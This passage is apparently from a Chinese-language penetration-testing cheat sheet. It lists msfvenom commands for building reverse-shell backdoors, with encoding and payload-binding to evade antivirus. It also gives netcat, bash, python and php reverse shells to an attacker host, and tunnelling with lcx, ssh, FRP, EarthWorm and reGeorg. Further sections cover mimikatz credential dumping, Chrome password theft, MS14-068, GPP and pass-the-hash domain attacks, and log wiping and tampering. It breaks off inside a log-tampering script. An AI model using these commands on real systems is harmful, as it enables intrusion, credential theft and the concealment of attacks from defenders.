<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai –i 10 –f exe –o upxtest.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -5 upxtest.exe –k</span><br></pre></td></tr></table></figure>

<p>MSF开启监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload &lt;payload_name&gt;</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;lhost_value&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT &lt;lport_value&gt;</span><br><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>

<p>生成二进制后门</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

<p>生成web后门</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p>生成脚本后门</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<p>生成shellcode后门</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<p>msfvenom常用的使用格式命令</p>
<p>普通生成</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p -f -o msfvenom -p windows/meterpreter/reverse_tcp -f exe -o C:\back.exe</span><br></pre></td></tr></table></figure>

<p>编码处理型</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe</span><br></pre></td></tr></table></figure>

<p>捆绑</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -platform windows -a x86 -x C:\nomal.exe -k -f exe -o C:\shell.exe</span><br></pre></td></tr></table></figure>

<p>Windows</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o C:\back.exe</span><br></pre></td></tr></table></figure>

<p>Linux</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p>Mac</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

<p>PHP</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>Asp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<p>Aspx</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f aspx &gt; shell.aspx</span><br></pre></td></tr></table></figure>

<p>Jsp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<p>War</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p>Bash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST= LPORT=-f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<p>Perl</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<p>Python</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverser_tcp LHOST= LPORT= -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<h3 id="其他权限维持"><a href="#其他权限维持" class="headerlink" title="其他权限维持"></a>其他权限维持</h3><p>使用msf在主机上注册一个服务，上传服务启动文件，隐藏等</p>
<h3 id="渗透框架"><a href="#渗透框架" class="headerlink" title="渗透框架"></a>渗透框架</h3><h4 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>编写shell反弹工具，拿到shell后和稳定程序绑定</p>
<h2 id="内网渗透代理"><a href="#内网渗透代理" class="headerlink" title="内网渗透代理"></a>内网渗透代理</h2><h3 id="Lcx端口转发"><a href="#Lcx端口转发" class="headerlink" title="Lcx端口转发"></a>Lcx端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机--主机A(1.1.1.2)---防火墙---主机B(192.168.1.2)</span><br></pre></td></tr></table></figure>

<p>跳板机转发</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">portmap -m 2 -p1 3950 -h2 1.1.1.2 -p2 3951</span><br><span class="line">Lcx.exe –listen 3950 3951</span><br><span class="line">将公网服务器的3950端口监听的数据转发到3951</span><br></pre></td></tr></table></figure>

<p>靶机转发</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 1.1.1.2 3950 192.168.1.2 3389</span><br><span class="line">将靶机的3389转发到公网服务器的3950上</span><br></pre></td></tr></table></figure>

<h3 id="ssh端口转发"><a href="#ssh端口转发" class="headerlink" title="ssh端口转发"></a>ssh端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C: 请求压缩所有数据</span><br><span class="line">-D: port 指定一个本地机器动态的应用程序端口转发</span><br><span class="line">-f: 要求在执行命令前退至后台</span><br><span class="line">-g: 允许远端主机连接本地转发的端口</span><br><span class="line">-L: 将本地机(客户机)的某个端口转发到远端指定机器的指定端口</span><br><span class="line">-N: 不执行远程命令. 用于转发端口.</span><br><span class="line">-R: 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口</span><br></pre></td></tr></table></figure>

<h4 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机--主机A(1.1.1.2)---防火墙---主机B(192.168.1.2)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 1111:192.168.1.2:80 -fN 1.1.1.2</span><br><span class="line">利用公网跳板机将192.168.1.2的80端口转发到1.1.1.2的1111端口</span><br></pre></td></tr></table></figure>

<h4 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机(1.1.1.1)---防火墙---主机B(192.168.1.2)</span><br><span class="line">				     |--主机A(192.168.1.1)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1111:192.168.1.2:80 -fN 1.1.1.1</span><br><span class="line">利用内网跳板机将192.168.1.2的80端口转发到1.1.1.1的1111端口</span><br></pre></td></tr></table></figure>

<h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机---主机A(1.1.1.2)---防火墙---主机B(192.168.1.2)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 -DfNg 1.1.1.2</span><br></pre></td></tr></table></figure>

<p>利用<code>proxychains</code>代理即可</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-c: 指定连接后要执行的shell命令</span><br><span class="line">-e: 指定连接后要执行的文件名</span><br><span class="line">-k: 配置Socker一直存活</span><br><span class="line">-l: 监听模式</span><br><span class="line">-p: 指定端口</span><br><span class="line">-u: 启动UDP协议传输</span><br><span class="line">-v: 显示指令执行过程</span><br></pre></td></tr></table></figure>

<h4 id="nc正向shell"><a href="#nc正向shell" class="headerlink" title="nc正向shell"></a>nc正向shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1111 -e /bin/bash</span><br><span class="line">监听本地1111端口，连接成功执行/bin/bash</span><br></pre></td></tr></table></figure>

<h4 id="nc反向shell"><a href="#nc反向shell" class="headerlink" title="nc反向shell"></a>nc反向shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 1.1.1.1 1111</span><br></pre></td></tr></table></figure>

<h4 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="variable">$&#123;HOST&#125;</span>/<span class="variable">$&#123;POST&#125;</span> 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h4 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;$&#123;HOST&#125;&quot;,$&#123;POST&#125;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;$&#123;HOST&#125;&quot;,$&#123;POST&#125;);exec(&quot;/bin/sh -i &amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="隐秘隧道搭建"><a href="#隐秘隧道搭建" class="headerlink" title="隐秘隧道搭建"></a>隐秘隧道搭建</h2><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><p>服务器配置</p>
<blockquote>
<p>frps.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000		# 要绑定的端口</span><br><span class="line"></span><br><span class="line">dashboard_user = admin	# 控制台的用户名</span><br><span class="line">dashboard_pwd = admin	# 控制台的密码</span><br><span class="line">dashboard_port = 6500	# 控制台的端口</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p>客户端设置</p>
<blockquote>
<p>frpc.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.100.101	 #代理服务器ip地址</span><br><span class="line">server_port = 7000				#代理服务器设置绑定的端口</span><br><span class="line"></span><br><span class="line">[rdp]					# 反向代理名称</span><br><span class="line">type = tcp				# 协议类型</span><br><span class="line">local_ip = 107.0.0.1	 # 本机ip地址</span><br><span class="line">local_post = 3389		 # 远程桌面的默认端口</span><br><span class="line">remote_post = 6005		 # 对外访问的端口</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p><code>mstsc.exe</code>远程桌面直接连接<code>192.168.122.18:6005</code>即可</p>
<h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><p>正向代理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 888</span><br></pre></td></tr></table></figure>

<p>之后利用<code>Proxifier</code>代理即可</p>
<h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -l 192.168.122.17 -p 8080 -u http://192.168.122.18/tunnel.nosocket.php</span><br></pre></td></tr></table></figure>

<p>之后利用<code>Proxifier</code>代理即可，设置代理规则<code>applications</code>为<code>python.exe</code>，<code>Action</code>为<code>Direct</code></p>
<h2 id="内网常见攻击"><a href="#内网常见攻击" class="headerlink" title="内网常见攻击"></a>内网常见攻击</h2><h3 id="MS17-010等"><a href="#MS17-010等" class="headerlink" title="MS17-010等"></a>MS17-010等</h3><p>利用msf远程利用即可</p>
<h3 id="网络设备漏洞"><a href="#网络设备漏洞" class="headerlink" title="网络设备漏洞"></a>网络设备漏洞</h3><p>路由器常见漏洞</p>
<blockquote>
<p>命令执行\未授权访问\拒绝服务\自带后门</p>
</blockquote>
<h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><p>Cobalt Strike钓鱼、Swaks配合CS钓鱼、Word&#x2F;Excel宏钓鱼、PPSX钓鱼(PPT动作特性构造)、文件名反转、重定向钓鱼、自解压等</p>
<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><h4 id="常用cmd指令"><a href="#常用cmd指令" class="headerlink" title="常用cmd指令"></a>常用cmd指令</h4><blockquote>
<p><code>net user</code> 查看本机用户<br><code>net user /domain</code> 查看域内用户<br><code>tasklist</code> 查看当前进程<br><code>netstat -ano</code> 查看端口列表<br><code>systeminfo</code> 查看修补程序<br><code>wmic qfe list full</code> 查看补丁信息</p>
</blockquote>
<h4 id="查看域信息"><a href="#查看域信息" class="headerlink" title="查看域信息"></a>查看域信息</h4><p>计算机右键属性即可</p>
<h4 id="用户习惯"><a href="#用户习惯" class="headerlink" title="用户习惯"></a>用户习惯</h4><ol>
<li>计划任务 <code>【开始】→【管理工具】→【任务计划程序】</code></li>
<li>最近打开的文档 <code>C:\Users\Administrator\Recent</code></li>
<li>收藏夹</li>
<li>文件搜索</li>
<li>历史记录等</li>
</ol>
<h4 id="密码收集"><a href="#密码收集" class="headerlink" title="密码收集"></a>密码收集</h4><ol>
<li>mimikatz</li>
<li>谷歌浏览器密码库 <code>C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data</code>，使用<a target="_blank" rel="noopener" href="https://github.com/pawelsalawa/sqlitestudio/releases">SQLiteStudio</a>打开等</li>
</ol>
<h3 id="域控攻击"><a href="#域控攻击" class="headerlink" title="域控攻击"></a>域控攻击</h3><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>漏洞利用步骤：</p>
<ol>
<li>获取SID <code>whoami /user</code></li>
<li>生成伪造票据 <code>ms14-086.exe -u (域用户@域) -p (域用户密码) -s (sid) -d (ac_ip)</code></li>
<li>删除缓存票据 <code>klist purge</code></li>
<li>导入票据获取域控权限 <code>kerberos::ptc 自定义命名.ccache</code></li>
<li>尝试列举域控C盘文件 <code>dir \\dc.really.com\c$</code></li>
</ol>
<h4 id="MS14-025"><a href="#MS14-025" class="headerlink" title="MS14-025"></a>MS14-025</h4><blockquote>
<p>在利用“MS14-025”漏洞开始之前需先知道利用失败或者出错可能是什么原因造成的，一般存在以下几种原因：</p>
<p>A．安装了GPP凭证补丁：KB2962486，这个补丁禁止在组策略配置中填入密码，补丁查询命令systeminfo查询是否有安装“KB2962486”补丁。<br>B．不在组策略中使用域控密码。<br>C．SYSVOL文件夹访问权限。<br>D．可能没使用GPP配置。</p>
</blockquote>
<p>漏洞利用步骤：</p>
<ol>
<li>判断SYSVOL文件夹访问权限。</li>
<li>查找XML文件。 <code>Groups.xml</code></li>
<li>解密XML文件中加密的密码信息。 <code>cpassword</code></li>
</ol>
<h4 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass the Hash"></a>Pass the Hash</h4><p>在使用NTLM身份验证的系统或服务上，用户密码永远不会以明文形式通过网络发送。本机Windows应用程序要求用户提供明文密码，然后调用LsaLogonUser 之类的API，将该密码转换为一个或两个哈希值（LM或NT哈希），然后在NTLM身份验证期间将其发送到远程服务器。对这种机制的分析表明，成功完成网络身份验证不需要明文密码，只需要哈希即可。</p>
<p>如果攻击者具有用户密码的哈希值，则无需强行使用明文密码；可以简单地使用已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成的原始密码。</p>
<p>攻击步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、获取NTLM Hash</span><br><span class="line">	privilege::debug			提升为debug权限</span><br><span class="line">	sekurlsa::logonpasswords	 显示最近登录过的用户和最近登录过的计算机的凭证</span><br><span class="line">2、hash传递</span><br><span class="line">	sekurlsa::pth /user:用户 /domain:域 /ntlm:hash</span><br></pre></td></tr></table></figure>

<h4 id="Ntml-Hash获取"><a href="#Ntml-Hash获取" class="headerlink" title="Ntml Hash获取"></a>Ntml Hash获取</h4><p>利用Responder工具，（搭建SMB服务、SQL服务器、FTP、HTTP等）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Dawn_whisper\AppData\Roaming\Typora\typora-user-images\image-20220714160306097.png" alt="image-20220714160306097"></p>
<h3 id="域权限维持"><a href="#域权限维持" class="headerlink" title="域权限维持"></a>域权限维持</h3><ol>
<li>使用黄金票据</li>
<li>SSP权限维持</li>
<li>Memory Updateing of SSPs权限维持</li>
<li>GPO组策略权限维持</li>
</ol>
<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>常用cmd命令</p>
<blockquote>
<p><code>net view /domain</code> 查看当前存在几个域<br><code>net time /domain</code> 查看域时间及域服务器的名字<br><code>ipconfig /all</code>  可查询DNS服务器<br><code>ping xxx.com</code> 获取域控制器IP，或者<code>nslookup、set type=a、really.com</code><br><code>net group “Domain Controllers” /domain</code> 查看域控主机名称<br><code>net group “domain admins” /domain</code> 查看域管理员</p>
</blockquote>
<h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><h3 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h3><blockquote>
<p><code>history</code> 查看命令历史记录<br><code>history -c</code> 清除命令历史记录</p>
</blockquote>
<p>设置不记录历史命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG</span><br><span class="line"><span class="built_in">export</span> HISTFILE=/dev/null</span><br><span class="line"><span class="built_in">export</span> HISTSIZE=0</span><br><span class="line"><span class="built_in">export</span> HISTFILESIZE=0</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>w</code> 查看utmp日志</p>
</blockquote>
<p>利用logtamper工具进行删除</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python logtamper.py –m 1 –u root –i 192.168.122.16</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>w</code> 查看wtmp日志</p>
</blockquote>
<p>同上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python logtamper.py –m 2 –u root –i 192.168.122.16</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>lastlog</code> 查看lastlog日志</p>
</blockquote>
<p>将上次登录事件修改为2018年9月24日10:11:12</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python logtamper.py –m 3 –u root –i 192.168.122.16 –t tty1 –d 2018:09:24:10:11:12</span><br></pre></td></tr></table></figure>

<p>logtamper.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 